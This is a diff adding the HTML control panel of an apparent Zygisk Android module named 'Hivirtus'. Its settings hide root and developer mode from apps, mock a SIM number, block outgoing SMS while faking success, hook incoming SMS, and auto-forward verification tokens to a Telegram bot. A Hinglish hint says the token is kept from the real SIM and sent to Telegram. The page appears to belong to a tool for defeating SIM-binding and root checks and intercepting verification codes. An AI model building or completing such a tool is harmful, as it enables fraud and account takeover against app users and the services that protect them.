@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <title>Hivirtus</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="shell">
+    <header class="top">
+      <div class="brand">
+        <span class="mark">V</span>
+        <div>
+          <div class="name">Hivirtus</div>
+          <div class="sub" id="statusLine">checking…</div>
+        </div>
+      </div>
+      <button type="button" class="icon-btn" id="btnMin" aria-label="Minimize">−</button>
+    </header>
+
+    <nav class="tabs" role="tablist">
+      <button class="tab active" data-tab="system">System</button>
+      <button class="tab" data-tab="sms">SMS</button>
+      <button class="tab" data-tab="telegram">Telegram</button>
+    </nav>
+
+    <main class="panels">
+      <section class="panel active" id="panel-system">
+        <label class="row">
+          <span>Hide developer</span>
+          <input type="checkbox" data-key="hide_developer" />
+        </label>
+        <label class="row">
+          <span>Hide root</span>
+          <input type="checkbox" data-key="hide_root" />
+        </label>
+        <label class="field">
+          <span>Mock SIM number</span>
+          <input type="tel" maxlength="10" inputmode="numeric" data-key="mock_phone_sim1" placeholder="10 digit" />
+        </label>
+        <label class="row">
+          <span>Enable mock SIM</span>
+          <input type="checkbox" data-key="enable_sim1_mock" />
+        </label>
+      </section>
+
+      <section class="panel" id="panel-sms">
+        <label class="row">
+          <span>Block outgoing SMS</span>
+          <input type="checkbox" data-key="hook_outgoing_sms" />
+        </label>
+        <label class="row">
+          <span>Fake success (intercept)</span>
+          <input type="checkbox" data-key="intercept_fake_success" />
+        </label>
+        <label class="row">
+          <span>Hook incoming SMS</span>
+          <input type="checkbox" data-key="hook_incoming_sms" />
+        </label>
+        <p class="hint">Intercept ON = verify token real SIM se nahi jayega. Telegram pe forward hoga.</p>
+      </section>
+
+      <section class="panel" id="panel-telegram">
+        <label class="field">
+          <span>Bot token</span>
+          <input type="text" data-key="telegram_bot_token" autocomplete="off" spellcheck="false" />
+        </label>
+        <label class="field">
+          <span>Chat ID</span>
+          <input type="text" data-key="telegram_chat_id" inputmode="numeric" />
+        </label>
+        <label class="row">
+          <span>Auto forward token</span>
+          <input type="checkbox" data-key="auto_forward_token" />
+        </label>
+      </section>
+    </main>
+
+    <footer class="foot">
+      <button type="button" class="primary" id="btnSave">Save</button>
+      <span class="credit">@hivirtus · zygisk</span>
+    </footer>
+  </div>
+  <script src="app.js"></script>
+</body>
+</html>
